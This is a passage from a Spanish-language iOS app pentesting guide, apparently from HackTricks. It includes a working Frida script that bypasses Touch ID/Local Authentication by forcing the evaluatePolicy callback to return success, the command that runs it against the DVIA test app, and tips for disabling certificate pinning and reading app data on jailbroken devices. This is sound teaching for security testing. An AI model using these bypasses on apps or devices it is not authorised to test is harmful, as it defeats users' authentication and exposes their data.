[TouchIDAuthentication showAlert:@"Your device doesn't support Touch ID or you haven't configured Touch ID authentication on your device" withTitle:@"Error"];
});
}
}
```
Para evadir la Autenticaci√≥n Local, debemos escribir un script de Frida que **evade** la mencionada comprobaci√≥n de _**evaluatePolicy**. Como se puede ver en el fragmento de c√≥digo anterior, **evaluatePolicy** utiliza un **callback** que determina el **resultado**. Por lo tanto, la forma m√°s sencilla de lograr el hackeo es interceptar ese callback y asegurarse de que siempre devuelva el valor de **success=1**.
```swift
// from https://securitycafe.ro/2022/09/05/mobile-pentesting-101-bypassing-biometric-authentication/
if(ObjC.available) {
console.log("Injecting...");
var hook = ObjC.classes.LAContext["- evaluatePolicy:localizedReason:reply:"];
Interceptor.attach(hook.implementation, {
onEnter: function(args) {
var block = new ObjC.Block(args[4]);
const callback = block.implementation;
block.implementation = function (error, value)  {

console.log("Changing the result value to true")
const result = callback(1, null);
return result;
};
},
});
} else {
console.log("Objective-C Runtime is not available!");
}
```

```
frida -U -f com.highaltitudehacks.DVIAswiftv2 --no-pause -l fingerprint-bypass-ios.js
```
## Exposici√≥n de Funcionalidad Sensible a trav√©s de IPC

### Controladores de URI personalizados / Enlaces profundos / Esquemas personalizados

{% content-ref url="ios-custom-uri-handlers-deeplinks-custom-schemes.md" %}
[ios-custom-uri-handlers-deeplinks-custom-schemes.md](ios-custom-uri-handlers-deeplinks-custom-schemes.md)
{% endcontent-ref %}

### Enlaces universales

{% content-ref url="ios-universal-links.md" %}
[ios-universal-links.md](ios-universal-links.md)
{% endcontent-ref %}

### Compartir con UIActivity

{% content-ref url="ios-uiactivity-sharing.md" %}
[ios-uiactivity-sharing.md](ios-uiactivity-sharing.md)
{% endcontent-ref %}

### UIPasteboard

{% content-ref url="ios-uipasteboard.md" %}
[ios-uipasteboard.md](ios-uipasteboard.md)
{% endcontent-ref %}

### Extensiones de la aplicaci√≥n

{% content-ref url="ios-app-extensions.md" %}
[ios-app-extensions.md](ios-app-extensions.md)
{% endcontent-ref %}

### WebViews

{% content-ref url="ios-webviews.md" %}
[ios-webviews.md](ios-webviews.md)
{% endcontent-ref %}

### Serializaci√≥n y codificaci√≥n

{% content-ref url="ios-serialisation-and-encoding.md" %}
[ios-serialisation-and-encoding.md](ios-serialisation-and-encoding.md)
{% endcontent-ref %}

## Comunicaci√≥n en red

Es importante verificar que no se est√© produciendo ninguna comunicaci√≥n **sin cifrado** y tambi√©n que la aplicaci√≥n est√© validando correctamente el **certificado TLS** del servidor.\
Para verificar este tipo de problemas, puedes utilizar un proxy como **Burp**:

{% content-ref url="burp-configuration-for-ios.md" %}
[burp-configuration-for-ios.md](burp-configuration-for-ios.md)
{% endcontent-ref %}

### Verificaci√≥n de nombre de host

Un problema com√∫n al validar el certificado TLS es verificar que el certificado haya sido firmado por una **CA de confianza**, pero **no verificar** si **el nombre de host** del certificado es el nombre de host al que se accede.\
Para verificar este problema utilizando Burp, despu√©s de confiar en la CA de Burp en el iPhone, puedes **crear un nuevo certificado con Burp para un nombre de host diferente** y utilizarlo. Si la aplicaci√≥n sigue funcionando, entonces algo es vulnerable.

### Pinning de certificados

Si una aplicaci√≥n est√° utilizando correctamente el Pinning de SSL, entonces la aplicaci√≥n solo funcionar√° si el certificado es el esperado. Al probar una aplicaci√≥n, **esto puede ser un problema ya que Burp servir√° su propio certificado**.\
Para evitar esta protecci√≥n en un dispositivo con jailbreak, puedes instalar la aplicaci√≥n [**SSL Kill Switch**](https://github.com/nabla-c0d3/ssl-kill-switch2) o instalar [**Burp Mobile Assistant**](https://portswigger.net/burp/documentation/desktop/mobile/config-ios-device)

Tambi√©n puedes utilizar el comando `ios sslpinning disable` de **objection**.

## Miscel√°neo

* En **`/System/Library`** puedes encontrar los frameworks instalados en el tel√©fono utilizados por las aplicaciones del sistema.
* Las aplicaciones instaladas por el usuario desde la App Store se encuentran en **`/User/Applications`**.
* Y **`/User/Library`** contiene los datos guardados por las aplicaciones a nivel de usuario.
* Puedes acceder a **`/User/Library/Notes/notes.sqlite`** para leer las notas guardadas dentro de la aplicaci√≥n.
* Dentro de la carpeta de una aplicaci√≥n instalada (**`/User/Applications/<ID DE LA APP>/`**) puedes encontrar algunos archivos interesantes:
* **`iTunesArtwork`**: El icono utilizado por la aplicaci√≥n.
* **`iTunesMetadata.plist`**: Informaci√≥n de la aplicaci√≥n utilizada en la App Store.
* **`/Library/*`**: Contiene las preferencias y la cach√©. En **`/Library/Cache/Snapshots/*`** puedes encontrar la instant√°nea realizada a la aplicaci√≥n antes de enviarla al segundo plano.

### Parcheo en caliente/Actualizaci√≥n forzada

Los desarrolladores pueden **parchear remotamente todas las instalaciones de su aplicaci√≥n al instante** sin tener que volver a enviar la aplicaci√≥n a la App Store y esperar a que sea aprobada.\
Para este prop√≥sito, generalmente se utiliza [**JSPatch**](https://github.com/bang590/JSPatch)**.** Pero tambi√©n hay otras opciones como [Siren](https://github.com/ArtSabintsev/Siren) y [react-native-appstore-version-checker](https://www.npmjs.com/package/react-native-appstore-version-checker).\
**Este es un mecanismo peligroso que podr√≠a ser abusado por SDK de terceros maliciosos, por lo tanto, se recomienda verificar qu√© m√©todo se utiliza para la actualizaci√≥n autom√°tica (si lo hay) y probarlo.** Puedes intentar descargar una versi√≥n anterior de la aplicaci√≥n con este prop√≥sito.

### Terceros

Un problema de los SDK de terceros es que no hay **control granular sobre las caracter√≠sticas ofrecidas por el SDK**. Puedes usar el SDK y tener todas las caracter√≠sticas (incluyendo fugas de diagn√≥stico y conexiones HTTP inseguras), o no usarlo. Adem√°s, por lo general, no es posible para los desarrolladores de aplicaciones **parchear una vulnerabilidad** en el SDK.\
Adem√°s, algunos SDK comienzan a **contener malware una vez que son muy confiables** para la comunidad.

Adem√°s, las caracter√≠sticas que estos servicios proporcionan pueden implicar servicios de **rastreo para monitorear el comportamiento del usuario** mientras utiliza la aplicaci√≥n, vender anuncios de banner o mejorar la experiencia del usuario. El inconveniente de los servicios de terceros es que los desarrolladores no conocen los detalles del c√≥digo ejecutado a trav√©s de las bibliotecas de terceros. En consecuencia, no se debe enviar m√°s informaci√≥n de la necesaria a un servicio y no se debe divulgar informaci√≥n confidencial.

El inconveniente es que un **desarrollador no conoce en detalle qu√© c√≥digo se ejecuta a trav√©s de las bibliotecas de terceros** y, por lo tanto, renuncia a la visibilidad. En consecuencia, se debe asegurar que no se env√≠e m√°s informaci√≥n de la necesaria al servicio y que no se divulgue informaci√≥n confidencial.

La mayor√≠a de los servicios de terceros se implementan de dos formas:

* con una biblioteca independiente
* con un SDK completo

Todos los datos que se env√≠an a los servicios de terceros deben ser anonimizados para evitar la exposici√≥n de informaci√≥n de identificaci√≥n personal (PII, por sus siglas en ingl√©s) que permitir√≠a al tercero identificar la cuenta de usuario.

Puedes encontrar las **bibliotecas utilizadas por una aplicaci√≥n** ejecutando **`otool`** contra la aplicaci√≥n (y **ejecut√°ndolo** contra **cada** biblioteca **compartida** para encontrar m√°s bibliotecas compartidas utilizadas).

## **Referencias**

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering)
* [iOS & Mobile App Pentesting - INE](https://my.ine.com/CyberSecurity/courses/089d060b/ios-mobile-app-pentesting)
## M√°s informaci√≥n

* [https://github.com/ivRodriguezCA/RE-iOS-Apps/](https://github.com/ivRodriguezCA/RE-iOS-Apps/) Curso gratuito de iOS ([https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/](https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/))
* [https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577](https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577)
* [https://www.slideshare.net/RyanISI/ios-appsecurityminicourse](https://www.slideshare.net/RyanISI/ios-appsecurityminicourse)
* [https://github.com/prateek147/DVIA](https://github.com/prateek147/DVIA)
* [https://github.com/prateek147/DVIA-v2](https://github.com/prateek147/DVIA-v2)
* [https://github.com/OWASP/MSTG-Hacking-Playground%20](https://github.com/OWASP/MSTG-Hacking-Playground)
* OWASP iGoat [_https://github.com/OWASP/igoat_](https://github.com/OWASP/igoat) <<< Versi√≥n Objective-C [_https://github.com/OWASP/iGoat-Swift_](https://github.com/OWASP/iGoat-Swift) <<< Versi√≥n Swift
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)
* [https://github.com/nabla-c0d3/ssl-kill-switch2](https://github.com/nabla-c0d3/ssl-kill-switch2)

![](../.gitbook/assets/image%20\(9\)%20\(1\)%20\(2\).png)

\
Utiliza [**Trickest**](https://trickest.io/) para construir y **automatizar flujos de trabajo** con las herramientas comunitarias m√°s avanzadas del mundo.\
Obt√©n acceso hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres que tu **empresa sea anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
